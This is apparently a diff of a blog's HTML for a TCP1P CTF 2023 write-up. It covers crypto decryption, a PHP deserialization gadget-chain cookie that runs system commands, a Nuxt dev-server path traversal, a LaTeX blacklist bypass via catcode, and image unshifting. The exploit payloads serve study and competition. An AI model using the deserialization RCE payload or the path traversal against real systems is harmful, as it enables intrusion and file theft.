+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">7</span>]: ct <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h</span><span style="color:#ae81ff">\x08\xaf</span><span style="color:#e6db74">mDV</span><span style="color:#ae81ff">\xaa\xcd\xea\xe9</span><span style="color:#e6db74">C</span><span style="color:#ae81ff">\xdd</span><span style="color:#e6db74">7/</span><span style="color:#ae81ff">\x1f</span><span style="color:#e6db74">F</span><span style="color:#ae81ff">\xe2</span><span style="color:#e6db74">?</span><span style="color:#ae81ff">\xcb\xb0\x1d</span><span style="color:#e6db74"> F</span><span style="color:#ae81ff">\xcc\xe5\xa6\x9d</span><span style="color:#e6db74">TJ</span><span style="color:#ae81ff">\\\xd1\x90\xac\xe0\x1c\x89</span><span style="color:#e6db74">1}</span><span style="color:#ae81ff">\x83</span><span style="color:#e6db74">*</span><span style="color:#ae81ff">\x86\xee\xc4</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\xa0\x18\xa8\x06\xea</span><span style="color:#e6db74">&#34;{|</span><span style="color:#ae81ff">\x0b\x92</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\x9a</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\x91\xc8\x19\xb7</span><span style="color:#e6db74">FK</span><span style="color:#ae81ff">\x01\xb5\xf9</span><span style="color:#e6db74">8</span><span style="color:#ae81ff">\x80\x9b</span><span style="color:#e6db74">R)2</span><span style="color:#ae81ff">\x84</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\xb3</span><span style="color:#e6db74">E</span><span style="color:#ae81ff">\t\xd5\xe5\xf0</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\x83\xc6\x19\x82\r\x7f\xfa</span><span style="color:#e6db74">GF</span><span style="color:#ae81ff">\xdb\xcb\xab\xd5</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\x95\t\xdd\xb5</span><span style="color:#e6db74">E&gt;F</span><span style="color:#ae81ff">\xdd\xa9\xa6\x82\x86\xee</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\xd9\xcc\xaf\xce\xf0\&#39;\xb3\xf4</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\xcf\xdb\xc8\xbd</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\x01\xd0</span><span style="color:#e6db74">,}]</span><span style="color:#ae81ff">\xd5</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\xd3</span><span style="color:#e6db74">?</span><span style="color:#ae81ff">\xb0\xe7\xb4</span><span style="color:#e6db74">[4</span><span style="color:#ae81ff">\x8a\xa2</span><span style="color:#e6db74">[</span><span style="color:#ae81ff">\xa1</span><span style="color:#e6db74">TV</span><span style="color:#ae81ff">\xd1</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\x1f\xbd</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\xa2\\</span><span style="color:#e6db74">K</span><span style="color:#ae81ff">\x16</span><span style="color:#e6db74">I%</span><span style="color:#ae81ff">\xda</span><span style="color:#e6db74">L</span><span style="color:#ae81ff">\xc6\xfb\xb7</span><span style="color:#e6db74">f.</span><span style="color:#ae81ff">\x98\xc3\xf4</span><span style="color:#e6db74">J</span><span style="color:#ae81ff">\x1b\xe9</span><span style="color:#e6db74">TT</span><span style="color:#ae81ff">\x83</span><span style="color:#e6db74">-</span><span style="color:#ae81ff">\x98</span><span style="color:#e6db74">BO</span><span style="color:#ae81ff">\xb4\x00</span><span style="color:#e6db74">~</span><span style="color:#ae81ff">\xb5</span><span style="color:#e6db74">w</span><span style="color:#ae81ff">\xcf</span><span style="color:#e6db74">7m</span><span style="color:#ae81ff">\xa1\xea\xa9\xf6\xa6\xee\x00</span><span style="color:#e6db74">Y</span><span style="color:#ae81ff">\xdf</span><span style="color:#e6db74">E</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\xe3\xa3\xa2\x1f</span><span style="color:#e6db74">=.</span><span style="color:#ae81ff">\x85\x08</span><span style="color:#e6db74">l</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">N</span><span style="color:#ae81ff">\xfb</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\x89\x8b</span><span style="color:#e6db74">B</span><span style="color:#ae81ff">\x7f\x94\x91</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\x10</span><span style="color:#e6db74">ep</span><span style="color:#ae81ff">\x9b\x06</span><span style="color:#e6db74">oz</span><span style="color:#ae81ff">\x87</span><span style="color:#e6db74">&amp;U]J</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">9</span><span style="color:#ae81ff">\x12</span><span style="color:#e6db74">W</span><span style="color:#ae81ff">\xce</span><span style="color:#e6db74">&lt;</span><span style="color:#ae81ff">\xc8\xa8\xb4</span><span style="color:#e6db74">v</span><span style="color:#ae81ff">\xaf</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\xb1</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x8b\xf5\xfe\xf8\r\xa7</span><span style="color:#e6db74">:r</span><span style="color:#ae81ff">\xe8\xe0</span><span style="color:#e6db74">fvKN</span><span style="color:#ae81ff">\\\xea\xe0\xa1\xe3\x99\xcc\xfd\x1a\x99</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\x90\xdf</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\xae\xad</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">8</span>]: key<span style="color:#f92672">=</span>xor(ct[<span style="color:#ae81ff">256</span>:],pad)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">9</span>]: ct_padded<span style="color:#f92672">=</span>xor(ct,key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">10</span>]: iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf5\x8e\x85</span><span style="color:#e6db74">ye</span><span style="color:#ae81ff">\xc8</span><span style="color:#e6db74">j(%</span><span style="color:#ae81ff">\xc4</span><span style="color:#e6db74">K</span><span style="color:#ae81ff">\xc1</span><span style="color:#e6db74">g#</span><span style="color:#ae81ff">\x86\x1a</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">11</span>]: <span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">12</span>]: cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">13</span>]: cipher<span style="color:#f92672">.</span>decrypt(ct_padded)
+</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">13</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;TCP1P{why_did_the_chicken_cross_the_road?To_ponder_the_meaning_of_life_on_the_other_side_only_to_realize_that_the_road_itself_was_an_arbitrary_construct_with_no_inherent_purpose_and_that_true_enlightenment_could_only_be_found_within_its_own_existence_1234}</span><span style="color:#ae81ff">\xba</span><span style="color:#e6db74">u</span><span style="color:#ae81ff">\xb9\x0c</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\xc4</span><span style="color:#e6db74">R</span><span style="color:#ae81ff">\x95</span><span style="color:#e6db74">O</span><span style="color:#ae81ff">\r\x85\x18\t</span><span style="color:#e6db74">H#F&#39;</span>
+</span></span></code></pre></div><p><code>FLAG: TCP1P{why_did_the_chicken_cross_the_road?To_ponder_the_meaning_of_life_on_the_other_side_only_to_realize_that_the_road_itself_was_an_arbitrary_construct_with_no_inherent_purpose_and_that_true_enlightenment_could_only_be_found_within_its_own_existence_1234}</code></p>
 <h1 id="web">Web</h1>
 <h2 id="un-secure">Un Secure</h2>
 <p>(68 Solves, 100 Points)</p>
@@ -599,7 +602,7 @@ Out[<span style="color:#ae81ff">13</span>]: <span style="color:#e6db74">b</span>
 <li>Then you wrap this object within the <code>$x</code> property of <code>GadgetOne\Adders</code>.</li>
 <li>Finally, this <code>GadgetOne\Adders</code> object (which now contains <code>GadgetThree\Vuln</code>) is wrapped within the <code>$klass</code> property of <code>GadgetTwo\Echoers</code>.</li>
 </ul>
-<pre tabindex="0"><code>b'O:17:&quot;GadgetTwo\\Echoers&quot;:1:{s:5:&quot;klass&quot;;O:16:&quot;GadgetOne\\Adders&quot;:1:{s:1:&quot;x&quot;;O:16:&quot;GadgetThree\\Vuln&quot;:4:{s:4:&quot;waf1&quot;;i:1;s:7:&quot;\x00*\x00waf2&quot;;s:4:&quot;\xde\xad\xbe\xef&quot;;s:10:&quot;\x00Vuln\x00waf3&quot;;b:0;s:3:&quot;cmd&quot;;s:13:&quot;system(\'ls\');&quot;;}}}'
+<pre tabindex="0"><code>b&#39;O:17:&#34;GadgetTwo\\Echoers&#34;:1:{s:5:&#34;klass&#34;;O:16:&#34;GadgetOne\\Adders&#34;:1:{s:1:&#34;x&#34;;O:16:&#34;GadgetThree\\Vuln&#34;:4:{s:4:&#34;waf1&#34;;i:1;s:7:&#34;\x00*\x00waf2&#34;;s:4:&#34;\xde\xad\xbe\xef&#34;;s:10:&#34;\x00Vuln\x00waf3&#34;;b:0;s:3:&#34;cmd&#34;;s:13:&#34;system(\&#39;ls\&#39;);&#34;;}}}&#39;
 </code></pre><p>Here is breakdown of the cookie payload before we encode it to base64:</p>
 <ol>
 <li><strong>Objects</strong>:
@@ -647,25 +650,25 @@ Out[<span style="color:#ae81ff">13</span>]: <span style="color:#e6db74">b</span>
 </ol>
 <p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/Pasted%20image%2020231020221419.png?raw=true" alt=""></p>
 <p>From this information, we can craft a new cookie to read the random filename of the flag, an decode it to base64</p>
-<pre tabindex="0"><code>b'O:17:&quot;GadgetTwo\\Echoers&quot;:1:{s:5:&quot;klass&quot;;O:16:&quot;GadgetOne\\Adders&quot;:1:{s:1:&quot;x&quot;;O:16:&quot;GadgetThree\\Vuln&quot;:4:{s:4:&quot;waf1&quot;;i:1;s:7:&quot;\x00*\x00waf2&quot;;s:4:&quot;\xde\xad\xbe\xef&quot;;s:10:&quot;\x00Vuln\x00waf3&quot;;b:0;s:3:&quot;cmd&quot;;s:65:&quot;var_dump(system(\'cat 182939124819238912571292389218129123.txt\'));&quot;;}}}'
+<pre tabindex="0"><code>b&#39;O:17:&#34;GadgetTwo\\Echoers&#34;:1:{s:5:&#34;klass&#34;;O:16:&#34;GadgetOne\\Adders&#34;:1:{s:1:&#34;x&#34;;O:16:&#34;GadgetThree\\Vuln&#34;:4:{s:4:&#34;waf1&#34;;i:1;s:7:&#34;\x00*\x00waf2&#34;;s:4:&#34;\xde\xad\xbe\xef&#34;;s:10:&#34;\x00Vuln\x00waf3&#34;;b:0;s:3:&#34;cmd&#34;;s:65:&#34;var_dump(system(\&#39;cat 182939124819238912571292389218129123.txt\&#39;));&#34;;}}}&#39;
 </code></pre><p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/Pasted%20image%2020231020221745.png?raw=true" alt=""></p>
 <p><code>FLAG: TCP1P{unserialize in php go brrrrrrrr ouch}</code></p>
 <h2 id="a-simple-web">A Simple Web</h2>
 <p>(122 Solves, 100 Points)</p>
 <p>Notice this part inside the Dockerfile</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>...<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Clone the Nuxt.js repository and switch to the desired release</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> git clone https://github.com/nuxt/framework.git /app <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>    cd /app <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>    git checkout v3.0.0-rc.12<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>...<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Start the Nuxt.js development server</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;pnpm&#34;</span>, <span style="color:#e6db74">&#34;run&#34;</span>, <span style="color:#e6db74">&#34;dev&#34;</span>, <span style="color:#e6db74">&#34;--host&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0&#34;</span>]<span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>Nuxt.js version <code>&lt;= rc12</code> is vulnerable to dev mode path traversal. This vulnerability permits arbitrary file reads while the dev server is running. This can provide a wide range of sensitive information on the target server depending on configuration. The root cause is due to Vite configuration has <code>strict</code> set to false.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>...<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Clone the Nuxt.js repository and switch to the desired release</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> git clone https://github.com/nuxt/framework.git /app <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    cd /app <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    git checkout v3.0.0-rc.12<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>...<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Start the Nuxt.js development server</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;pnpm&#34;</span>, <span style="color:#e6db74">&#34;run&#34;</span>, <span style="color:#e6db74">&#34;dev&#34;</span>, <span style="color:#e6db74">&#34;--host&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0&#34;</span>]<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Nuxt.js version <code>&lt;= rc12</code> is vulnerable to dev mode path traversal. This vulnerability permits arbitrary file reads while the dev server is running. This can provide a wide range of sensitive information on the target server depending on configuration. The root cause is due to Vite configuration has <code>strict</code> set to false.
 <a href="https://huntr.com/bounties/4849af83-450c-435e-bc0b-71705f5be440/">Dev mode Path traversal vulnerability found in framework (huntr.com)</a></p>
 <p>The path traversal can be exploited as follow:
 <code>/_nuxt/@fs/flag.txt</code></p>
@@ -673,15 +676,15 @@ Out[<span style="color:#ae81ff">13</span>]: <span style="color:#e6db74">b</span>
 <h2 id="latex">Latex</h2>
 <p>(Solved after competition has ended, 38 Solves, 100 Points)</p>
 <p>Notice this part of <code>main.go</code> which contains blacklisted strings</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">var</span> (
-	<span style="color:#75715e">//go:embed static/*
-</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">static</span>    <span style="color:#a6e22e">embed</span>.<span style="color:#a6e22e">FS</span>
-	<span style="color:#a6e22e">blacklist</span> = []<span style="color:#66d9ef">string</span>{<span style="color:#e6db74">&#34;\\input&#34;</span>, <span style="color:#e6db74">&#34;include&#34;</span>, <span style="color:#e6db74">&#34;newread&#34;</span>, <span style="color:#e6db74">&#34;openin&#34;</span>, <span style="color:#e6db74">&#34;file&#34;</span>, <span style="color:#e6db74">&#34;read&#34;</span>, <span style="color:#e6db74">&#34;closein&#34;</span>,
-		<span style="color:#e6db74">&#34;usepackage&#34;</span>, <span style="color:#e6db74">&#34;fileline&#34;</span>, <span style="color:#e6db74">&#34;verbatiminput&#34;</span>, <span style="color:#e6db74">&#34;url&#34;</span>, <span style="color:#e6db74">&#34;href&#34;</span>, <span style="color:#e6db74">&#34;text&#34;</span>, <span style="color:#e6db74">&#34;write&#34;</span>,
-		<span style="color:#e6db74">&#34;newwrite&#34;</span>, <span style="color:#e6db74">&#34;outfile&#34;</span>, <span style="color:#e6db74">&#34;closeout&#34;</span>, <span style="color:#e6db74">&#34;immediate&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;write18&#34;</span>, <span style="color:#e6db74">&#34;includegraphics&#34;</span>,
-		<span style="color:#e6db74">&#34;openout&#34;</span>, <span style="color:#e6db74">&#34;newcommand&#34;</span>, <span style="color:#e6db74">&#34;expandafter&#34;</span>, <span style="color:#e6db74">&#34;csname&#34;</span>, <span style="color:#e6db74">&#34;endcsname&#34;</span>, <span style="color:#e6db74">&#34;^^&#34;</span>}
-)
-</code></pre></div><p>We can bypass the blacklist using the <code>\catcode</code> command. which will change the category code (often referred to as &ldquo;catcode&rdquo;) of a character. Every character in LaTeX has a category code that dictates its behavior.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//go:embed static/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">static</span>    <span style="color:#a6e22e">embed</span>.<span style="color:#a6e22e">FS</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">blacklist</span> = []<span style="color:#66d9ef">string</span>{<span style="color:#e6db74">&#34;\\input&#34;</span>, <span style="color:#e6db74">&#34;include&#34;</span>, <span style="color:#e6db74">&#34;newread&#34;</span>, <span style="color:#e6db74">&#34;openin&#34;</span>, <span style="color:#e6db74">&#34;file&#34;</span>, <span style="color:#e6db74">&#34;read&#34;</span>, <span style="color:#e6db74">&#34;closein&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;usepackage&#34;</span>, <span style="color:#e6db74">&#34;fileline&#34;</span>, <span style="color:#e6db74">&#34;verbatiminput&#34;</span>, <span style="color:#e6db74">&#34;url&#34;</span>, <span style="color:#e6db74">&#34;href&#34;</span>, <span style="color:#e6db74">&#34;text&#34;</span>, <span style="color:#e6db74">&#34;write&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;newwrite&#34;</span>, <span style="color:#e6db74">&#34;outfile&#34;</span>, <span style="color:#e6db74">&#34;closeout&#34;</span>, <span style="color:#e6db74">&#34;immediate&#34;</span>, <span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;write18&#34;</span>, <span style="color:#e6db74">&#34;includegraphics&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;openout&#34;</span>, <span style="color:#e6db74">&#34;newcommand&#34;</span>, <span style="color:#e6db74">&#34;expandafter&#34;</span>, <span style="color:#e6db74">&#34;csname&#34;</span>, <span style="color:#e6db74">&#34;endcsname&#34;</span>, <span style="color:#e6db74">&#34;^^&#34;</span>}
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>We can bypass the blacklist using the <code>\catcode</code> command. which will change the category code (often referred to as &ldquo;catcode&rdquo;) of a character. Every character in LaTeX has a category code that dictates its behavior.</p>
 <pre tabindex="0"><code>\documentclass[12pt]{article}
 \begin{document}
 \catcode`\@=0 
@@ -724,56 +727,55 @@ It turns out to be the Octal representation of ASCII. The resulting URL, when vi
 <a href="https://files.doxbin.gg/o3VdrMpt.png">https://files.doxbin.gg/o3VdrMpt.png</a>
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/o3VdrMpt.png?raw=true" alt=""></p>
 <p>The following code will unshift the image to its original state:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
-<span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unshift_row</span>(row, shift, width):
-    <span style="color:#e6db74">&#34;&#34;&#34;
-</span><span style="color:#e6db74">    Unshift a given row by the specified number of pixels.
-</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
-    left <span style="color:#f92672">=</span> row[:width <span style="color:#f92672">-</span> shift]
-    right <span style="color:#f92672">=</span> row[width <span style="color:#f92672">-</span> shift:]
-    <span style="color:#66d9ef">return</span> right <span style="color:#f92672">+</span> left
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unshift_image</span>(image):
-    <span style="color:#e6db74">&#34;&#34;&#34;
-</span><span style="color:#e6db74">    Unshift the rows of the given image.
-</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
-    pixels <span style="color:#f92672">=</span> list(image<span style="color:#f92672">.</span>getdata())
-    w, h <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>size
-    
-    <span style="color:#75715e"># Convert the 1D pixel data to 2D</span>
-    pixels_2d <span style="color:#f92672">=</span> [pixels[i <span style="color:#f92672">*</span> w : (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> w] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(h)]
-    
-    shift <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-    result <span style="color:#f92672">=</span> []
-    <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> pixels_2d:
-        new_row <span style="color:#f92672">=</span> unshift_row(row, shift, w)
-        result<span style="color:#f92672">.</span>append(new_row)
-        
-        <span style="color:#75715e"># Increase shift and wrap around row length</span>
-        shift <span style="color:#f92672">=</span> (shift <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">%</span> w
-        
-    <span style="color:#66d9ef">return</span> np<span style="color:#f92672">.</span>array(result, dtype<span style="color:#f92672">=</span>np<span style="color:#f92672">.</span>uint8)
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(input_image_path, output_image_path):
-    image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(input_image_path)
-    array <span style="color:#f92672">=</span> unshift_image(image)
-    new_image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(array)
-    new_image<span style="color:#f92672">.</span>save(output_image_path)
-
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-    main(<span style="color:#e6db74">&#39;o3VdrMpt.png&#39;</span>, <span style="color:#e6db74">&#39;unshifted.png&#39;</span>)
-
-</code></pre></div><p>unshifted.png
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unshift_row</span>(row, shift, width):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Unshift a given row by the specified number of pixels.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    left <span style="color:#f92672">=</span> row[:width <span style="color:#f92672">-</span> shift]
+</span></span><span style="display:flex;"><span>    right <span style="color:#f92672">=</span> row[width <span style="color:#f92672">-</span> shift:]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> right <span style="color:#f92672">+</span> left
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unshift_image</span>(image):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Unshift the rows of the given image.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    pixels <span style="color:#f92672">=</span> list(image<span style="color:#f92672">.</span>getdata())
+</span></span><span style="display:flex;"><span>    w, h <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>size
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Convert the 1D pixel data to 2D</span>
+</span></span><span style="display:flex;"><span>    pixels_2d <span style="color:#f92672">=</span> [pixels[i <span style="color:#f92672">*</span> w : (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> w] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(h)]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    shift <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> pixels_2d:
+</span></span><span style="display:flex;"><span>        new_row <span style="color:#f92672">=</span> unshift_row(row, shift, w)
+</span></span><span style="display:flex;"><span>        result<span style="color:#f92672">.</span>append(new_row)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Increase shift and wrap around row length</span>
+</span></span><span style="display:flex;"><span>        shift <span style="color:#f92672">=</span> (shift <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">%</span> w
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> np<span style="color:#f92672">.</span>array(result, dtype<span style="color:#f92672">=</span>np<span style="color:#f92672">.</span>uint8)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(input_image_path, output_image_path):
+</span></span><span style="display:flex;"><span>    image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(input_image_path)
+</span></span><span style="display:flex;"><span>    array <span style="color:#f92672">=</span> unshift_image(image)
+</span></span><span style="display:flex;"><span>    new_image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(array)
+</span></span><span style="display:flex;"><span>    new_image<span style="color:#f92672">.</span>save(output_image_path)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main(<span style="color:#e6db74">&#39;o3VdrMpt.png&#39;</span>, <span style="color:#e6db74">&#39;unshifted.png&#39;</span>)
+</span></span></code></pre></div><p>unshifted.png
 <img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/post/tcp1p-ctf-2023/unshifted.png?raw=true" alt=""></p>
 <p>The presence of <code>======</code> indicates that it might be base32-encoded text. After appending the two texts, base32 decoding, and then base64 decoding it, we get our flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">21</span>]: b32decode(<span style="color:#e6db74">&#34;KZCU4UKNKZBDOY2HKJWVQMTHGBSGUTTGJZDDSUKNK5HDAZCYJF5FQMSKONSFQSTGJZDTK22YPJLG6TKXLIYGMULPHU======&#34;</span>)
